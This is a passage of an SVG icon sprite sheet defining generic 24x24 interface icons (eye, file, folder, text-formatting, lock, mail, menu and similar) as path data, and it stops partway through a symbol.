<path fill-rule="evenodd" clip-rule="evenodd" d="M1 12C2.73 7.61 7 4.5 12 4.5C17 4.5 21.27 7.61 23 12C21.27 16.39 17 19.5 12 19.5C7 19.5 2.73 16.39 1 12ZM20.82 12C19.17 8.63 15.79 6.5 12 6.5C8.21 6.5 4.83 8.63 3.18 12C4.83 15.37 8.21 17.5 12 17.5C15.79 17.5 19.17 15.37 20.82 12ZM12 9.5C13.38 9.5 14.5 10.62 14.5 12C14.5 13.38 13.38 14.5 12 14.5C10.62 14.5 9.5 13.38 9.5 12C9.5 10.62 10.62 9.5 12 9.5ZM7.5 12C7.5 9.52 9.52 7.5 12 7.5C14.48 7.5 16.5 9.52 16.5 12C16.5 14.48 14.48 16.5 12 16.5C9.52 16.5 7.5 14.48 7.5 12Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__File" viewBox="0 0 24 24">
    <path d="M0 0h24v24H0V0z" fill="none"></path>
    <path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Filter" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M19.2492 4H4.75087C4.08468 4 3.74853 4.80831 4.22056 5.28034L10 11.0607V17.5C10 17.7447 10.1194 17.9741 10.3199 18.1144L12.8199 19.8638C13.3131 20.2091 14 19.8592 14 19.2494V11.0607L19.7796 5.28034C20.2507 4.80925 19.9168 4 19.2492 4Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__EyeOff" viewBox="0 0 24 24">
<path d="M0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0zm0 0h24v24H0V0z" fill="none"></path>
<path d="M12 6c3.79 0 7.17 2.13 8.82 5.5-.59 1.22-1.42 2.27-2.41 3.12l1.41 1.41c1.39-1.23 2.49-2.77 3.18-4.53C21.27 7.11 17 4 12 4c-1.27 0-2.49.2-3.64.57l1.65 1.65C10.66 6.09 11.32 6 12 6zm-1.07 1.14L13 9.21c.57.25 1.03.71 1.28 1.28l2.07 2.07c.08-.34.14-.7.14-1.07C16.5 9.01 14.48 7 12 7c-.37 0-.72.05-1.07.14zM2.01 3.87l2.68 2.68C3.06 7.83 1.77 9.53 1 11.5 2.73 15.89 7 19 12 19c1.52 0 2.98-.29 4.32-.82l3.42 3.42 1.41-1.41L3.42 2.45 2.01 3.87zm7.5 7.5l2.61 2.61c-.04.01-.08.02-.12.02-1.38 0-2.5-1.12-2.5-2.5 0-.05.01-.08.01-.13zm-3.4-3.4l1.75 1.75c-.23.55-.36 1.15-.36 1.78 0 2.48 2.02 4.5 4.5 4.5.63 0 1.23-.13 1.77-.36l.98.98c-.88.24-1.8.38-2.75.38-3.79 0-7.17-2.13-8.82-5.5.7-1.43 1.72-2.61 2.93-3.53z"></path>
</symbol><symbol id="icon__Folder" viewBox="0 0 24 24">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatColor" viewBox="0 0 24 24">
<path d="M0 18.5H24V22.5H0V18.5Z" fill="CurrentColor"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M5.5 15.5L11 1.5H13L18.49 15.5H16.24L15.12 12.5H8.87L7.75 15.5H5.5ZM12 4.17001L9.62 10.5H14.38L12 4.17001Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__FolderFilled" viewBox="0 0 24 24">
    <path d="M0 0h24v24H0z" fill="none"></path>
    <path d="M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z" fill="CurrentColor"></path>
</symbol><symbol id="icon__FormatColorFill" viewBox="0 0 24 24">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.62 0L16.56 8.94C17.15 9.53 17.15 10.48 16.56 11.06L11.06 16.56C10.77 16.85 10.38 17 10 17C9.62 17 9.23 16.85 8.94 16.56L3.44 11.06C2.85 10.48 2.85 9.53 3.44 8.94L8.59 3.79L6.21 1.41L7.62 0ZM10 5.21L5.21 10H14.79L10 5.21ZM19 11.5C19 11.5 17 13.67 17 15C17 16.1 17.9 17 19 17C20.1 17 21 16.1 21 15C21 13.67 19 11.5 19 11.5ZM24 20H0V24H24V20Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatBold" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M15.225 11.79C16.195 11.12 16.875 10.02 16.875 9C16.875 6.74 15.125 5 12.875 5H6.625V19H13.665C15.755 19 17.375 17.3 17.375 15.21C17.375 13.69 16.515 12.39 15.225 11.79ZM9.625 7.5H12.625C13.455 7.5 14.125 8.17 14.125 9C14.125 9.83 13.455 10.5 12.625 10.5H9.625V7.5ZM9.625 16.5H13.125C13.955 16.5 14.625 15.83 14.625 15C14.625 14.17 13.955 13.5 13.125 13.5H9.625V16.5Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__FormatFontFamily" viewBox="0 0 24 24">
  <path d="M11.2212 16.2262C11.2212 16.6745 11.2572 17.0348 11.3293 17.3071C11.4093 17.5793 11.5174 17.7955 11.6535 17.9556C11.7976 18.1077 11.9658 18.2198 12.1579 18.2919C12.3581 18.3559 12.5783 18.404 12.8185 18.436L13.2869 18.5201L13.1908 20.85C12.8305 20.818 12.4382 20.7859 12.0138 20.7539C11.6455 20.7299 11.2172 20.7099 10.7288 20.6939C10.2484 20.6699 9.72392 20.6578 9.15545 20.6578C8.60299 20.6578 7.98648 20.6658 7.30592 20.6819C6.63336 20.6979 5.86472 20.7539 5 20.85L5.09608 18.5201C5.30425 18.496 5.52043 18.472 5.74462 18.448C5.93678 18.432 6.14895 18.416 6.38115 18.4C6.62135 18.3759 6.85754 18.3639 7.08974 18.3639C7.12176 17.8995 7.14979 17.3871 7.17381 16.8267C7.19783 16.2582 7.22185 15.6737 7.24587 15.0732C7.27789 14.4647 7.30191 13.8522 7.31793 13.2357C7.34195 12.6192 7.36196 12.0307 7.37798 11.4702C7.39399 10.9017 7.406 10.3733 7.41401 9.88489C7.42201 9.39648 7.42602 8.97613 7.42602 8.62384C7.42602 8.18348 7.38999 7.82718 7.31793 7.55495C7.24587 7.28273 7.14178 7.07055 7.00567 6.91842C6.87756 6.75829 6.71743 6.6462 6.52527 6.58215C6.33311 6.51009 6.11693 6.45404 5.87673 6.41401L5.40834 6.34195L5.51643 4C6.01284 4.04804 6.50925 4.08807 7.00567 4.1201C7.50208 4.15213 8.0065 4.18015 8.51892 4.20417C9.03936 4.22819 9.5758 4.24821 10.1283 4.26422C10.6887 4.27223 11.2812 4.27623 11.9057 4.27623C13.0747 4.27623 14.2877 4.25221 15.5448 4.20417C16.8098 4.15613 18.1389 4.08807 19.5321 4L19.1598 9.6567H16.3855L16.3134 8.99615C16.2734 8.6919 16.2093 8.41967 16.1212 8.17947C16.0412 7.93127 15.9251 7.71909 15.7729 7.54294C15.6208 7.3668 15.4247 7.22668 15.1845 7.12259C14.9443 7.01851 14.648 6.94645 14.2957 6.90641L11.5935 6.63019L11.3653 11.6023L16.1933 11.4102L16.0612 14.3886L11.2932 14.0644L11.2212 16.2262Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatHorzRule" viewBox="0 0 24 24">
  <path d="M0 10H24V14H0V10Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatIndentDecrease" viewBox="0 0 24 24">
  <path d="M11 17H21V15H11V17ZM3 12L7 16V8L3 12ZM3 21H21V19H3V21ZM3 3V5H21V3H3ZM11 9H21V7H11V9ZM11 13H21V11H11V13Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatIndentIncrease" viewBox="0 0 24 24">
  <path d="M3 21H21V19H3V21ZM3 8V16L7 12L3 8ZM11 17H21V15H11V17ZM3 3V5H21V3H3ZM11 9H21V7H11V9ZM11 13H21V11H11V13Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatListBulleted" viewBox="0 0 24 24">
  <path d="M4 10.5C3.17 10.5 2.5 11.17 2.5 12C2.5 12.83 3.17 13.5 4 13.5C4.83 13.5 5.5 12.83 5.5 12C5.5 11.17 4.83 10.5 4 10.5ZM4 4.5C3.17 4.5 2.5 5.17 2.5 6C2.5 6.83 3.17 7.5 4 7.5C4.83 7.5 5.5 6.83 5.5 6C5.5 5.17 4.83 4.5 4 4.5ZM4 16.5C3.17 16.5 2.5 17.18 2.5 18C2.5 18.82 3.18 19.5 4 19.5C4.82 19.5 5.5 18.82 5.5 18C5.5 17.18 4.83 16.5 4 16.5ZM7 19H21V17H7V19ZM7 13H21V11H7V13ZM7 5V7H21V5H7Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatListNumbered" viewBox="0 0 24 24">
  <path d="M2 17H4V17.5H3V18.5H4V19H2V20H5V16H2V17ZM3 8H4V4H2V5H3V8ZM2 11H3.8L2 13.1V14H5V13H3.2L5 10.9V10H2V11ZM7 5V7H21V5H7ZM7 19H21V17H7V19ZM7 13H21V11H7V13Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatSize" viewBox="0 0 24 24">
  <path d="M9 4V7H14V19H17V7H22V4H9ZM3 12H6V19H9V12H12V9H3V12Z" fill="currentColor"></path>
</symbol><symbol id="icon__FormatItalic" viewBox="0 0 24 24">
<path d="M10 5V8H12.21L8.79 16H6V19H14V16H11.79L15.21 8H18V5H10Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__FormatStrike" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M6.85 8.575C6.85 9.21499 6.98 9.765 7.24 10.245C7.27155 10.3081 7.31556 10.3774 7.35728 10.4432C7.36844 10.4608 7.37944 10.4781 7.39 10.495H12C11.36 10.275 10.97 10.045 10.59 9.795C10.1 9.465 9.85 9.065 9.85 8.585C9.85 8.355 9.9 8.135 10 7.925C10.1 7.715 10.25 7.535 10.44 7.375C10.63 7.225 10.87 7.105 11.16 7.015C11.45 6.925 11.8 6.885 12.19 6.885C12.59 6.885 12.95 6.945 13.25 7.045C13.55 7.15499 13.8 7.295 14 7.485C14.2 7.675 14.35 7.895 14.44 8.165C14.54 8.425 14.59 8.705 14.59 9.015H17.6C17.6 8.355 17.47 7.755 17.22 7.205C16.97 6.655 16.61 6.175 16.14 5.775C15.68 5.375 15.11 5.055 14.45 4.835C13.78 4.605 13.05 4.495 12.24 4.495C11.45 4.495 10.72 4.595 10.06 4.785C9.41 4.985 8.84 5.265 8.36 5.615C7.88 5.975 7.51 6.405 7.25 6.905C6.98 7.415 6.85 7.96499 6.85 8.575ZM21 11.495V13.495V13.515H17.13C17.19 13.615 17.25 13.735 17.3 13.845C17.51 14.315 17.61 14.855 17.61 15.455C17.61 16.095 17.48 16.665 17.23 17.165C16.98 17.665 16.62 18.095 16.16 18.435C15.7 18.775 15.14 19.035 14.49 19.225C13.84 19.415 13.11 19.505 12.31 19.505C11.83 19.505 11.35 19.455 10.87 19.375C10.39 19.285 9.93 19.155 9.49 18.985C9.05 18.815 8.64 18.595 8.27 18.335C7.89 18.075 7.57 17.765 7.29 17.415C7.01 17.055 6.8 16.655 6.64 16.205C6.48 15.755 6.4 15.175 6.4 14.625H9.37C9.37 15.075 9.48 15.525 9.62 15.835C9.76 16.145 9.96 16.395 10.21 16.585C10.46 16.775 10.77 16.915 11.12 17.005C11.47 17.095 11.87 17.135 12.3 17.135C12.68 17.135 13.02 17.085 13.31 17.005C13.6 16.915 13.83 16.805 14.02 16.655C14.21 16.505 14.35 16.325 14.44 16.125C14.53 15.915 14.58 15.695 14.58 15.465C14.58 15.205 14.54 14.975 14.47 14.775C14.39 14.565 14.25 14.375 14.04 14.205C13.83 14.035 13.54 13.865 13.17 13.695C13.0936 13.6644 12.9991 13.6313 12.901 13.5969C12.8064 13.5637 12.7084 13.5294 12.62 13.495H3V11.495H21Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__FormatUnderline" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18 11C18 14.31 15.31 17 12 17C8.69 17 6 14.31 6 11V3H8.5V11C8.5 12.93 10.07 14.5 12 14.5C13.93 14.5 15.5 12.93 15.5 11V3H18V11ZM5 21V19H19V21H5Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Grabber" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M9 4C7.9 4 7 4.9 7 6C7 7.1 7.9 8 9 8C10.1 8 11 7.1 11 6C11 4.9 10.1 4 9 4ZM7 12C7 10.9 7.9 10 9 10C10.1 10 11 10.9 11 12C11 13.1 10.1 14 9 14C7.9 14 7 13.1 7 12ZM9 20C10.1 20 11 19.1 11 18C11 16.9 10.1 16 9 16C7.9 16 7 16.9 7 18C7 19.1 7.9 20 9 20ZM17 6C17 7.1 16.1 8 15 8C13.9 8 13 7.1 13 6C13 4.9 13.9 4 15 4C16.1 4 17 4.9 17 6ZM15 10C13.9 10 13 10.9 13 12C13 13.1 13.9 14 15 14C16.1 14 17 13.1 17 12C17 10.9 16.1 10 15 10ZM13 18C13 16.9 13.9 16 15 16C16.1 16 17 16.9 17 18C17 19.1 16.1 20 15 20C13.9 20 13 19.1 13 18Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Grid" viewBox="0 0 24 24">
<path d="M3 11H11V3H3V11ZM5 5H9V9H5V5ZM13 21H21V13H13V21ZM15 15H19V19H15V15ZM3 21H11V13H3V21ZM5 15H9V19H5V15ZM13 3V11H21V3H13ZM19 9H15V5H19V9Z" fill="currentColor"></path>
</symbol><symbol id="icon__Help" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M2 12C2 6.48 6.48 2 12 2C17.52 2 22 6.48 22 12C22 17.52 17.52 22 12 22C6.48 22 2 17.52 2 12ZM13 16V18H11V16H13ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20ZM8 10C8 7.79 9.79 6 12 6C14.21 6 16 7.79 16 10C16 11.2829 15.21 11.9733 14.4408 12.6455C13.711 13.2833 13 13.9046 13 15H11C11 13.1787 11.9421 12.4566 12.7704 11.8217C13.4202 11.3236 14 10.8792 14 10C14 8.9 13.1 8 12 8C10.9 8 10 8.9 10 10H8Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__HelpSolidSmall" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M18 12C18 15.3144 15.3135 18 12 18C8.68652 18 6 15.3144 6 12C6 8.68749 8.68652 6 12 6C15.3135 6 18 8.68749 18 12ZM12.161 7.98387C10.8425 7.98387 10.0016 8.53928 9.34125 9.5264C9.2557 9.65429 9.28432 9.82676 9.40693 9.91974L10.2464 10.5563C10.3724 10.6518 10.5518 10.629 10.6496 10.5049C11.0818 9.95675 11.3782 9.63888 12.036 9.63888C12.5302 9.63888 13.1416 9.95697 13.1416 10.4362C13.1416 10.7986 12.8425 10.9846 12.3545 11.2582L12.3134 11.2812C11.7498 11.5966 11.0322 11.9981 11.0322 12.9677V13.0645C11.0322 13.2248 11.1622 13.3548 11.3226 13.3548H12.6774C12.8377 13.3548 12.9677 13.2248 12.9677 13.0645V13.0323C12.9677 12.7719 13.2554 12.6059 13.6132 12.3994C14.2018 12.0597 14.9803 11.6105 14.9803 10.4516C14.9803 9.04834 13.5247 7.98387 12.161 7.98387ZM10.8871 15.0968C10.8871 14.4831 11.3863 13.9839 12 13.9839C12.6137 13.9839 13.1129 14.4831 13.1129 15.0968C13.1129 15.7104 12.6137 16.2097 12 16.2097C11.3863 16.2097 10.8871 15.7104 10.8871 15.0968Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Home" viewBox="0 0 24 24">
<path d="M12 5.69L17 10.19V18H15V12H9V18H7V10.19L12 5.69ZM12 3L2 12H5V20H11V14H13V20H19V12H22L12 3Z" fill="currentColor"></path>
</symbol><symbol id="icon__HelpSolid" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M22 12C22 17.5241 17.5225 22 12 22C6.47754 22 2 17.5241 2 12C2 6.47915 6.47754 2 12 2C17.5225 2 22 6.47915 22 12ZM12.2684 5.30645C10.0709 5.30645 8.66941 6.23214 7.56885 7.87734C7.42627 8.09048 7.47397 8.37794 7.67832 8.5329L9.07748 9.59379C9.28736 9.75294 9.58639 9.71508 9.74945 9.50823C10.4698 8.5946 10.9637 8.0648 12.0601 8.0648C12.8838 8.0648 13.9027 8.59496 13.9027 9.39375C13.9027 9.99762 13.4042 10.3077 12.5909 10.7638L12.5224 10.8021C11.5831 11.3277 10.3872 11.9968 10.3872 13.6129V13.7742C10.3872 14.0414 10.6038 14.2581 10.871 14.2581H13.1291C13.3963 14.2581 13.613 14.0414 13.613 13.7742V13.7204C13.613 13.2865 14.0924 13.0099 14.6888 12.6657C15.6698 12.0996 16.9672 11.3509 16.9672 9.41936C16.9672 7.08057 14.5412 5.30645 12.2684 5.30645ZM10.1451 17.1613C10.1451 16.1385 10.9772 15.3065 12 15.3065C13.0228 15.3065 13.8548 16.1385 13.8548 17.1613C13.8548 18.184 13.0228 19.0161 12 19.0161C10.9772 19.0161 10.1451 18.184 10.1451 17.1613Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Image" viewBox="0 0 24 24">
  <path d="M21 19V5C21 3.9 20.1 3 19 3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19ZM8.5 13.5L11 16.51L14.5 12L19 18H5L8.5 13.5Z" fill="currentColor"></path>
</symbol><symbol id="icon__ImageOutline" viewBox="0 0 24 24">
<path d="M21 3H3C2 3 1 4 1 5V19C1 20.1 1.9 21 3 21H21C22 21 23 20 23 19V5C23 4 22 3 21 3ZM21 18.92C20.98 18.95 20.94 18.98 20.92 19H3V5.08L3.08 5H20.91C20.94 5.02 20.97 5.06 20.99 5.08V18.92H21ZM11 15.51L8.5 12.5L5 17H19L14.5 11L11 15.51Z" fill="currentColor"></path>
</symbol><symbol id="icon__Key" viewBox="0 0 24 24">
<path d="M12.65 10C11.83 7.67 9.61 6 7 6C3.69 6 1 8.69 1 12C1 15.31 3.69 18 7 18C9.61 18 11.83 16.33 12.65 14H17V18H21V14H23V10H12.65ZM7 14C5.9 14 5 13.1 5 12C5 10.9 5.9 10 7 10C8.1 10 9 10.9 9 12C9 13.1 8.1 14 7 14Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__Lightbulb" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C8.14 2 5 5.14 5 9C5 11.38 6.19 13.47 8 14.74V17C8 17.55 8.45 18 9 18H15C15.55 18 16 17.55 16 17V14.74C17.81 13.47 19 11.38 19 9C19 5.14 15.86 2 12 2ZM9 21C9 21.55 9.45 22 10 22H14C14.55 22 15 21.55 15 21V20H9V21ZM14 13.7L14.85 13.1C16.2 12.16 17 10.63 17 9C17 6.24 14.76 4 12 4C9.24 4 7 6.24 7 9C7 10.63 7.8 12.16 9.15 13.1L10 13.7V16H14V13.7Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__LightbulbMultiple" viewBox="0 0 24 24">
<path d="M11.9997 21.0001C11.9997 21.5501 12.4497 22.0001 12.9997 22.0001H14.9997C15.5497 22.0001 15.9997 21.5501 15.9997 21.0001V20.0001H11.9997V21.0001ZM13.9997 7.0001C11.2397 7.0001 8.99973 9.2401 8.99973 12.0001C8.99973 13.5701 9.73973 15.0601 10.9997 16.0001V18.0001C10.9997 18.5501 11.4497 19.0001 11.9997 19.0001H15.9997C16.5497 19.0001 16.9997 18.5501 16.9997 18.0001V16.0001C19.2097 14.3401 19.6597 11.2101 17.9997 9.0001C17.0597 7.7401 15.5697 7.0001 13.9997 7.0001ZM14.9997 14.8201V17.0001H12.9997V14.8201C11.4397 14.2701 10.6197 12.5501 11.1697 11.0001C11.7197 9.4301 13.4397 8.6101 14.9997 9.1601C16.5597 9.7201 17.3797 11.4301 16.8297 13.0001C16.5297 13.8501 15.8497 14.5001 14.9997 14.8201ZM7.67973 15.0001H6.99973V16.0001C6.99973 16.5501 7.44973 17.0001 7.99973 17.0001H8.99973V16.8801C8.45973 16.3301 7.99973 15.7001 7.67973 15.0001ZM13.5997 5.0001C12.4997 2.4701 9.52973 1.3301 6.99973 2.4501C4.46973 3.5701 3.33973 6.5001 4.44973 9.0401C4.78973 9.8101 5.32973 10.5001 5.99973 11.0001V13.0001C5.99973 13.5501 6.44973 14.0001 6.99973 14.0001H7.29973C7.09973 13.3501 6.99973 12.6801 6.99973 12.0001C6.99973 8.2901 9.88973 5.2101 13.5997 5.0001Z" fill="currentColor"></path>
</symbol><symbol id="icon__LightbulbOn" viewBox="0 0 24 24">
<path d="M20 11H23V13H20V11ZM1 11H4V13H1V11ZM13 1V4H11V1H13ZM4.92 3.5L7.05 5.64L5.63 7.05L3.5 4.93L4.92 3.5ZM16.95 5.63L19.07 3.5L20.5 4.93L18.37 7.05L16.95 5.63ZM12 6C13.5913 6 15.1174 6.63214 16.2426 7.75736C17.3679 8.88258 18 10.4087 18 12C18 14.22 16.79 16.16 15 17.2V19C15 19.2652 14.8946 19.5196 14.7071 19.7071C14.5196 19.8946 14.2652 20 14 20H10C9.73478 20 9.48043 19.8946 9.29289 19.7071C9.10536 19.5196 9 19.2652 9 19V17.2C7.21 16.16 6 14.22 6 12C6 10.4087 6.63214 8.88258 7.75736 7.75736C8.88258 6.63214 10.4087 6 12 6ZM14 21V22C14 22.2652 13.8946 22.5196 13.7071 22.7071C13.5196 22.8946 13.2652 23 13 23H11C10.7348 23 10.4804 22.8946 10.2929 22.7071C10.1054 22.5196 10 22.2652 10 22V21H14ZM11 18H13V15.87C14.73 15.43 16 13.86 16 12C16 10.9391 15.5786 9.92172 14.8284 9.17157C14.0783 8.42143 13.0609 8 12 8C10.9391 8 9.92172 8.42143 9.17157 9.17157C8.42143 9.92172 8 10.9391 8 12C8 13.86 9.27 15.43 11 15.87V18Z" fill="currentColor"></path>
</symbol><symbol id="icon__LightningBolt" viewBox="0 0 24 24">
<path d="M10.8 21.809V14.409H7L13.5 2.10902C13.6 1.90902 13.9 2.00902 13.9 2.20902V9.60902H17.6L11.3 21.909C11.2 22.109 10.8 22.109 10.8 21.809ZM9.7 12.709H12.5V16.009L14.9 11.209H12.3V7.90902L9.7 12.709Z" fill="currentColor"></path>
</symbol><symbol id="icon__LightningBoltFilled" viewBox="0 0 24 24">
<path d="M11 14H6.5L13 2V10H17.5L11 22V14Z" fill="currentColor"></path>
</symbol><symbol id="icon__LinkVertical" viewBox="0 0 24 24">
<path d="M12 20.1C10.29 20.1 8.9 18.71 8.9 17V13H7L7 17C7 19.76 9.24 22 12 22C14.76 22 17 19.76 17 17V13H15.1V17C15.1 18.71 13.71 20.1 12 20.1ZM13 16V8H11V16H13ZM7 7V11H8.9V7C8.9 5.29 10.29 3.9 12 3.9C13.71 3.9 15.1 5.29 15.1 7L15.1 11H17V7C17 4.24 14.76 2 12 2C9.24 2 7 4.24 7 7Z" fill="currentColor"></path>
</symbol><symbol id="icon__Link" viewBox="0 0 24 24">
  <path d="M3.9 12C3.9 10.29 5.29 8.9 7 8.9H11V7H7C4.24 7 2 9.24 2 12C2 14.76 4.24 17 7 17H11V15.1H7C5.29 15.1 3.9 13.71 3.9 12ZM8 13H16V11H8V13ZM17 7H13V8.9H17C18.71 8.9 20.1 10.29 20.1 12C20.1 13.71 18.71 15.1 17 15.1H13V17H17C19.76 17 22 14.76 22 12C22 9.24 19.76 7 17 7Z" fill="currentColor"></path>
</symbol><symbol id="icon__List" viewBox="0 0 24 24">
<path d="M19 5V19H5V5H19ZM20.1 3H3.9C3.4 3 3 3.4 3 3.9V20.1C3 20.5 3.4 21 3.9 21H20.1C20.5 21 21 20.5 21 20.1V3.9C21 3.4 20.5 3 20.1 3ZM11 7H17V9H11V7ZM11 11H17V13H11V11ZM11 15H17V17H11V15ZM7 7H9V9H7V7ZM7 11H9V13H7V11ZM7 15H9V17H7V15Z" fill="currentColor"></path>
</symbol><symbol id="icon__LockClock" viewBox="0 0 24 24">
<path d="M6 20V10H18V11C18.7 11 19.37 11.1 20 11.29V10C20 8.9 19.1 8 18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H12.26C11.84 21.4 11.51 20.72 11.29 20H6ZM9 6C9 4.34 10.34 3 12 3C13.66 3 15 4.34 15 6V8H9V6Z" fill="currentColor"></path>
<path d="M18 13C15.24 13 13 15.24 13 18C13 20.76 15.24 23 18 23C20.76 23 23 20.76 23 18C23 15.24 20.76 13 18 13ZM19.65 20.35L17.5 18.2V15H18.5V17.79L20.35 19.64L19.65 20.35Z" fill="currentColor"></path>
</symbol><symbol id="icon__Lock" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M17.2188 10.875H18.0625C18.9941 10.875 19.75 11.6309 19.75 12.5625V19.3125C19.75 20.2441 18.9941 21 18.0625 21H5.6875C4.75586 21 4 20.2441 4 19.3125V12.5625C4 11.6309 4.75586 10.875 5.6875 10.875H6.53125V8.34375C6.53125 5.39766 8.92891 3 11.875 3C14.8211 3 17.2188 5.39766 17.2188 8.34375V10.875ZM9.34375 8.34375V10.875H14.4062V8.34375C14.4062 6.94805 13.2707 5.8125 11.875 5.8125C10.4793 5.8125 9.34375 6.94805 9.34375 8.34375Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__LockSmall" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M15.8125 11.25H16.375C16.9961 11.25 17.5 11.7539 17.5 12.375V16.875C17.5 17.4961 16.9961 18 16.375 18H8.125C7.50391 18 7 17.4961 7 16.875V12.375C7 11.7539 7.50391 11.25 8.125 11.25H8.6875V9.5625C8.6875 7.59844 10.2859 6 12.25 6C14.2141 6 15.8125 7.59844 15.8125 9.5625V11.25ZM10.5625 9.5625V11.25H13.9375V9.5625C13.9375 8.63203 13.1805 7.875 12.25 7.875C11.3195 7.875 10.5625 8.63203 10.5625 9.5625Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__LockOutline" viewBox="0 0 24 24">
<path d="M18 8H17V6C17 3.24 14.76 1 12 1C9.24 1 7 3.24 7 6V8H6C4.9 8 4 8.9 4 10V20C4 21.1 4.9 22 6 22H18C19.1 22 20 21.1 20 20V10C20 8.9 19.1 8 18 8ZM9 6C9 4.34 10.34 3 12 3C13.66 3 15 4.34 15 6V8H9V6ZM18 20H6V10H18V20ZM12 17C13.1 17 14 16.1 14 15C14 13.9 13.1 13 12 13C10.9 13 10 13.9 10 15C10 16.1 10.9 17 12 17Z" fill="currentColor"></path>
</symbol><symbol id="icon__Mail" viewBox="0 0 24 24">
<path fill-rule="evenodd" clip-rule="evenodd" d="M22 6C22 4.9 21.1 4 20 4H4C2.9 4 2 4.9 2 6V18C2 19.1 2.9 20 4 20H20C21.1 20 22 19.1 22 18V6ZM20 6L12 10.99L4 6H20ZM12 13L4 8V18H20V8L12 13Z" fill="CurrentColor"></path>
</symbol><symbol id="icon__MailFilled" viewBox="0 0 24 24">
<path d="M0 0h24v24H0z" fill="none"></path>
<path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" fill="currentColor"></path>
</symbol><symbol id="icon__MenuClose" viewBox="0 0 24 24">
<path d="M9 18H22V16H9V18ZM9 13H22V11H9V13ZM9 6V8H22V6H9Z" fill="currentColor"></path>
<path d="M6 8L2 12L6 16V8Z" fill="currentColor"></path>
</symbol><symbol id="icon__Menu" viewBox="0 0 24 24">
<path d="M3 18H21V16H3V18ZM3 13H21V11H3V13ZM3 6V8H21V6H3Z" fill="currentColor"></path>
</symbol><symbol id="icon__MenuOpen" viewBox="0 0 24 24">
<path d="M3 18H16V16H3V18ZM3 13H13V11H3V13ZM3 6V8H16V6H3ZM21 15.59L17.42 12L21 8.41L19.59 7L14.59 12L19.59 17L21 15.59Z" fill="currentColor"></path>
</symbol><symbol id="icon__Money" viewBox="0 0 24 24">
<path d="M12.48 10.9C10.21 10.31 9.48 9.7 9.48 8.75C9.48 7.66 10.49 6.9 12.18 6.9C13.96 6.9 14.62 7.75 14.68 9H16.89C16.82 7.28 15.77 5.7 13.68 5.19V3H10.68V5.16C8.74 5.58 7.18 6.84 7.18 8.77C7.18 11.08 9.09 12.23 11.88 12.9C14.38 13.5 14.88 14.38 14.88 15.31C14.88 16 14.39 17.1 12.18 17.1C10.12 17.1 9.31 16.18 9.2 15H7C7.12 17.19 8.76 18.42 10.68 18.83V21H13.68V18.85C15.63 18.48 17.18 17.35 17.18 15.3C17.18 12.46 14.75 11.49 12.48 10.9Z" fill="#212338"></path>
</symbol><symbol id="icon__Minus" viewBox="0 0 24 24">
<path d="M0 0h24v24H0V0z" fill="none"></path>
<path d="M19 13H5v-2h14v2z"></path>
</symbol><symbol id="icon__MoreHorizontal" viewBox="0 0 24 24">
